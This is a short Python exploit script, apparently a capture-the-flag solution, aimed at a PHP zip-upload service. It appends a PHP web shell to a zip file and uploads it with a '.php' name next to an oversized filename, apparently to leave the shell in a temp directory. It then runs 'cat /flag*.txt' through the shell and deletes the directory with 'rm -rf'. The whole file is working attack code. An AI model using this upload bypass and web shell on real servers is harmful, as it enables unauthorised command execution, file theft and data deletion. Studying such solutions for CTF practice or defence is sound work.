import requests
import os
import re

HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '8004')
URL = f'http://{HOST}:{PORT}'

os.system("touch a")
os.system("zip a.zip a")

with open("a.zip", "rb") as f:
    valid = f.read()
invalid = valid + b"\n<?php system($_GET['oz']); ?>\n"

r = requests.post(URL, files=[
    ('zipfile[]', (".king-kazuma.zip.php", invalid, 'application/zip')),
    ('zipfile[]', ("A"*0x1000+".zip", valid, 'application/zip'))
])
dname = re.findall("Failed to upload the file: ([0-9a-f]+)", r.text)[0]
print(dname)

r = requests.get(f'{URL}/temp/{dname}/.king-kazuma.zip.php', params={
    'oz': 'cat /flag*.txt'
})
print(r.text)

requests.get(f'{URL}/temp/{dname}/.king-kazuma.zip.php', params={
    'oz': f'rm /var/www/html/temp/{dname} -rf'
})

os.system("rm a a.zip")
